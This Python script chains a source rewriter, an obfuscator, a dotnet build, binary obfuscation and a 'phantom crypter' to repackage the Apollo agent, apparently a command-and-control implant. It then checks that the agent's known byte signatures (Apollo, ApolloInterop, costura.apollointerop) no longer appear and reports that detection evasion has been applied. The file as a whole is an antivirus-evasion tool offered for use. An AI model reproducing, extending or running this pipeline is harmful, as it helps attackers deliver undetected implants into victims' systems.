#!/usr/bin/env python3
"""
Phantom Build System - Complete Apollo Obfuscation Pipeline
Removes ALL Apollo references before and after compilation
"""

import os
import sys
import shutil
import subprocess
import tempfile
from pathlib import Path

def run_assembly_rewriter():
    """Run assembly rewriter to clean source code"""
    print("[+] Phase 1: Rewriting source code to remove Apollo references")
    
    try:
        rewriter_path = Path(__file__).parent / "assembly_rewriter.py"
        if rewriter_path.exists():
            result = subprocess.run([sys.executable, str(rewriter_path)], 
                                  capture_output=True, text=True)
            print(f"Assembly rewriter output: {result.stdout}")
            if result.stderr:
                print(f"Assembly rewriter errors: {result.stderr}")
            return result.returncode == 0
        else:
            print("[-] Assembly rewriter not found")
            return False
    except Exception as e:
        print(f"[-] Assembly rewriter failed: {e}")
        return False

def run_advanced_obfuscator():
    """Run advanced source code obfuscator"""
    print("[+] Phase 2: Applying advanced obfuscation to source code")
    
    try:
        obfuscator_path = Path(__file__).parent / "advanced_obfuscator.py"
        if obfuscator_path.exists():
            result = subprocess.run([sys.executable, str(obfuscator_path)], 
                                  capture_output=True, text=True)
            print(f"Advanced obfuscator output: {result.stdout}")
            if result.stderr:
                print(f"Advanced obfuscator errors: {result.stderr}")
            return result.returncode == 0
        else:
            print("[-] Advanced obfuscator not found")
            return False
    except Exception as e:
        print(f"[-] Advanced obfuscator failed: {e}")
        return False

def build_apollo_executable(apollo_dir):
    """Build the Apollo executable with MSBuild"""
    print("[+] Phase 3: Building executable with MSBuild")
    
    try:
        # Find solution or project file
        sln_files = list(Path(apollo_dir).glob("*.sln"))
        csproj_files = list(Path(apollo_dir).glob("**/*.csproj"))
        
        if sln_files:
            build_file = sln_files[0]
        elif csproj_files:
            build_file = csproj_files[0]
        else:
            print("[-] No solution or project file found")
            return False, None
        
        print(f"[+] Building: {build_file}")
        
        # Build command
        build_cmd = [
            "dotnet", "build", str(build_file),
            "--configuration", "Release",
            "--verbosity", "minimal"
        ]
        
        result = subprocess.run(build_cmd, capture_output=True, text=True, cwd=apollo_dir)
        
        if result.returncode == 0:
            print("[+] Build successful")
            
            # Find the output executable
            bin_dirs = list(Path(apollo_dir).glob("**/bin/Release/**/*.exe"))
            if bin_dirs:
                exe_path = bin_dirs[0]
                print(f"[+] Executable found: {exe_path}")
                return True, exe_path
            else:
                print("[-] Executable not found in build output")
                return False, None
        else:
            print(f"[-] Build failed: {result.stderr}")
            return False, None
            
    except Exception as e:
        print(f"[-] Build error: {e}")
        return False, None

def run_binary_obfuscator(exe_path):
    """Run binary obfuscator on compiled executable"""
    print("[+] Phase 4: Applying binary-level obfuscation")
    
    try:
        obfuscator_path = Path(__file__).parent / "binary_obfuscator.py"
        if obfuscator_path.exists():
            result = subprocess.run([sys.executable, str(obfuscator_path), str(exe_path)], 
                                  capture_output=True, text=True)
            print(f"Binary obfuscator output: {result.stdout}")
            if result.stderr:
                print(f"Binary obfuscator errors: {result.stderr}")
            return result.returncode == 0
        else:
            print("[-] Binary obfuscator not found")
            return False
    except Exception as e:
        print(f"[-] Binary obfuscator failed: {e}")
        return False

def run_phantom_crypter(exe_path):
    """Run phantom crypter for final packing"""
    print("[+] Phase 5: Applying phantom crypter")
    
    try:
        crypter_path = Path(__file__).parent / "phantom_crypter.py"
        if crypter_path.exists():
            result = subprocess.run([sys.executable, str(crypter_path), str(exe_path)], 
                                  capture_output=True, text=True)
            print(f"Phantom crypter output: {result.stdout}")
            if result.stderr:
                print(f"Phantom crypter errors: {result.stderr}")
            return result.returncode == 0
        else:
            print("[-] Phantom crypter not found")
            return False
    except Exception as e:
        print(f"[-] Phantom crypter failed: {e}")
        return False

def validate_apollo_removal(exe_path):
    """Validate that Apollo references have been removed"""
    print("[+] Phase 6: Validating Apollo reference removal")
    
    try:
        with open(exe_path, 'rb') as f:
            content = f.read()
        
        apollo_signatures = [
            b'Apollo',
            b'ApolloInterop',
            b'Apollo.exe',
            b'costura.apollointerop'
        ]
        
        found_signatures = []
        for signature in apollo_signatures:
            if signature in content:
                found_signatures.append(signature.decode('utf-8', errors='ignore'))
        
        if found_signatures:
            print(f"[-] Apollo signatures still found: {found_signatures}")
            return False
        else:
            print("[+] No Apollo signatures detected in final binary")
            return True
            
    except Exception as e:
        print(f"[-] Validation error: {e}")
        return False

def main():
    """Main phantom build pipeline"""
    print("=== Phantom Apollo Build Pipeline ===")
    
    # Find Apollo directory
    apollo_dirs = [
        "apollo/agent_code/Apollo",
        "apollo/agent_code", 
        "Agent/Apollo",
        "Apollo"
    ]
    
    apollo_dir = None
    for dir_path in apollo_dirs:
        if os.path.exists(dir_path):
            apollo_dir = dir_path
            break
    
    if not apollo_dir:
        print("[-] Apollo directory not found")
        return False
    
    print(f"[+] Using Apollo directory: {apollo_dir}")
    
    # Create backup
    backup_dir = f"{apollo_dir}_backup"
    if os.path.exists(backup_dir):
        shutil.rmtree(backup_dir)
    shutil.copytree(apollo_dir, backup_dir)
    print(f"[+] Backup created: {backup_dir}")
    
    try:
        # Phase 1: Assembly rewriting
        if not run_assembly_rewriter():
            print("[-] Assembly rewriting failed")
            return False
        
        # Phase 2: Advanced obfuscation
        if not run_advanced_obfuscator():
            print("[-] Advanced obfuscation failed")
            return False
        
        # Phase 3: Build executable
        build_success, exe_path = build_apollo_executable(apollo_dir)
        if not build_success:
            print("[-] Build failed")
            return False
        
        # Phase 4: Binary obfuscation
        if not run_binary_obfuscator(exe_path):
            print("[-] Binary obfuscation failed")
            return False
        
        # Phase 5: Phantom crypter
        if not run_phantom_crypter(exe_path):
            print("[-] Phantom crypter failed")
            return False
        
        # Phase 6: Validation
        if not validate_apollo_removal(exe_path):
            print("[-] Apollo signatures still present")
            return False
        
        print("=== Phantom Apollo Build Complete ===")
        print(f"[+] Final executable: {exe_path}")
        print("[+] All Apollo references successfully removed")
        print("[+] Detection evasion applied")
        
        return True
        
    except Exception as e:
        print(f"[-] Build pipeline failed: {e}")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)